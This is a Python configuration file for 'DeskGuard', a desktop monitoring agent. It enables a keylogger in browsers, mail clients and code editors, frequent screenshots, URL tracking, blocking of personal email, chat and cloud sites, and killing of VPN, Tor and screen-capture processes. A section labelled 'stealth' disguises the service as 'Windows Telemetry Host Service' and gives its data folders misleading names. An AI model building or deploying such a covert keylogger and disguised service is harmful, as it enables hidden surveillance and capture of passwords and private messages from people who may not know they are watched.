# agent/config.py
# ─────────────────────────────────────────────────────────────────────────────
# DeskGuard — Agent Configuration
# Edit before deploying to each machine.
# ─────────────────────────────────────────────────────────────────────────────

import os, socket

# ── Product identity ──────────────────────────────────────────────────────────
PRODUCT_NAME    = "DeskGuard"
PRODUCT_VERSION = "1.0.0"
VENDOR_NAME     = "Your Company Name"    # change before distributing

# ── Mode ──────────────────────────────────────────────────────────────────────
# "local"   → store in local SQLite only, no server needed
# "server"  → upload to server only
# "hybrid"  → store locally AND upload to server every hour (RECOMMENDED)
MODE = "local"

# ── Server connection (only used when MODE = "server" or "hybrid") ────────────
SERVER_URL = "https://monitor.yourdomain.com"
API_KEY    = "REPLACE_WITH_MACHINE_API_KEY"

# ── Machine identity ──────────────────────────────────────────────────────────
MACHINE_NAME = socket.gethostname()

# ── Upload / flush schedule ───────────────────────────────────────────────────
LOCAL_FLUSH_EVERY  = 300     # flush buffers to local DB every 5 min
UPLOAD_EVERY       = 3600    # upload to server every 1 hour
CONFIG_SYNC_EVERY  = 900     # pull config from server every 15 min

# ── Screenshot settings ───────────────────────────────────────────────────────
SCREENSHOT_INTERVAL  = 180   # seconds between captures
SCREENSHOT_QUALITY   = 60    # JPEG quality 1-95
SCREENSHOT_ON_SWITCH = True  # also capture on every window switch

# ── Activity tracking ─────────────────────────────────────────────────────────
ACTIVITY_POLL_INTERVAL = 10          # poll foreground window every N seconds
IDLE_THRESHOLD_SECONDS = 300         # mark idle after 5 min no input

# ── URL tracking ──────────────────────────────────────────────────────────────
URL_POLL_INTERVAL = 30
BROWSERS = ["chrome", "edge", "firefox", "opera"]

# ── Keylogger ─────────────────────────────────────────────────────────────────
KEYLOG_ENABLED     = True
KEYLOG_APPS        = [                # only log keystrokes in these apps
    "chrome.exe", "msedge.exe", "firefox.exe", "opera.exe",
    "outlook.exe", "thunderbird.exe", "code.exe",
]
KEYLOG_FLUSH_EVERY = 60

# ── Website blocker ───────────────────────────────────────────────────────────
WEBSITE_BLOCKER_ENABLED = False      # True = modify hosts file, False = skip

WEBSITE_BLOCKLIST = [
    # Facebook
    "facebook.com", "www.facebook.com", "m.facebook.com",
    # Instagram
    "instagram.com", "www.instagram.com",
    # TikTok
    "tiktok.com", "www.tiktok.com", "m.tiktok.com",
    # Twitter / X
    "twitter.com", "www.twitter.com", "x.com", "www.x.com", "t.co",
    # Snapchat
    "snapchat.com", "www.snapchat.com",
    # Gmail / Google Mail
    "mail.google.com", "gmail.com", "m.gmail.com", "inbox.google.com",
    "smtp.gmail.com", "imap.gmail.com", "pop.gmail.com",
    # Yahoo Mail
    "mail.yahoo.com", "smtp.mail.yahoo.com", "imap.mail.yahoo.com",
    # Outlook / Hotmail (personal)
    "outlook.live.com", "hotmail.com", "www.hotmail.com",
    "smtp.live.com", "imap-mail.outlook.com", "smtp-mail.outlook.com",
    # ProtonMail
    "protonmail.com", "mail.proton.me", "smtp.protonmail.com",
    # Other personal email
    "fastmail.com", "www.fastmail.com",
    "tutanota.com", "www.tutanota.com",
    # Personal cloud storage
    "drive.google.com",
    "dropbox.com", "www.dropbox.com", "api.dropboxapi.com",
    "wetransfer.com", "www.wetransfer.com",
    "mega.nz", "g.api.mega.co.nz",
    # WhatsApp
    "web.whatsapp.com", "www.whatsapp.com", "whatsapp.com",
    "whatsapp.net", "e.whatsapp.net", "g.whatsapp.net",
    "media.whatsapp.net", "mmg.whatsapp.net", "static.whatsapp.net",
    # Telegram
    "web.telegram.org", "telegram.org", "www.telegram.org",
    "t.me", "core.telegram.org", "api.telegram.org",
    # Discord
    "discord.com", "www.discord.com", "discordapp.com",
    # Entertainment
    "netflix.com", "www.netflix.com",
    "hotstar.com", "www.hotstar.com",
    "twitch.tv", "www.twitch.tv",
    "youtube.com", "www.youtube.com", "m.youtube.com",
    # Proxy / VPN
    "hidemyass.com", "hide.me", "proxysite.com", "kproxy.com",
]

# ── App blacklist (process names — killed immediately when detected) ───────────
APP_BLACKLIST = [
    # Screen capture / recording
    "obs64.exe", "obs32.exe", "obs.exe",
    "sharex.exe", "snagit32.exe", "camtasia.exe", "bandicam.exe",
    # File transfer
    "filezilla.exe", "winscp.exe",
    "utorrent.exe", "bittorrent.exe", "qbittorrent.exe",
    # WhatsApp
    "whatsapp.exe", "WhatsApp.exe", "whatsappdesktop.exe",
    # Telegram
    "telegram.exe",
    # Discord
    "discord.exe", "discordptb.exe", "discordcanary.exe",
    # VPN / proxy
    "nordvpn.exe", "expressvpn.exe", "protonvpn.exe", "psiphon.exe",
    "hotspotshield.exe", "tunnelbear.exe", "cyberghost.exe",
    # Personal cloud sync
    "dropbox.exe", "googledrivesync.exe",
    # Unauthorized remote access
    "teamviewer.exe", "teamviewer_service.exe", "anydesk.exe",
    # Tor
    "tor.exe", "torbrowser.exe",
]

# ── USB guard ─────────────────────────────────────────────────────────────────
USB_GUARD_ENABLED     = True
USB_POLL_INTERVAL     = 10
USB_BLOCK_MODE        = "alert"       # "alert" = log only | "block" = eject
USB_WHITELIST_SERIALS = []            # serial numbers of IT-approved USBs

# ── Local data paths ──────────────────────────────────────────────────────────
DATA_DIR          = os.path.join(os.environ.get("PROGRAMDATA", "C:\\ProgramData"), "WinTelemetryHost")
SCREENSHOT_DIR    = os.path.join(DATA_DIR, "cache", "img")
LOG_FILE          = os.path.join(DATA_DIR, "svc.log")
LOCAL_DB_FILENAME = "sys_perf.db"
LOCAL_DB_PATH     = os.path.join(DATA_DIR, LOCAL_DB_FILENAME)

# ── Keylog encryption ─────────────────────────────────────────────────────────
# Generate key: python -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())"
# Set as system env var: setx MONITOR_FERNET_KEY "your-key" /M

# ── Service identity (stealth) ────────────────────────────────────────────────
SERVICE_NAME         = "WinTelemetryHost"
SERVICE_DISPLAY_NAME = "Windows Telemetry Host Service"
SERVICE_DESCRIPTION  = "Collects system performance and telemetry data for Windows."
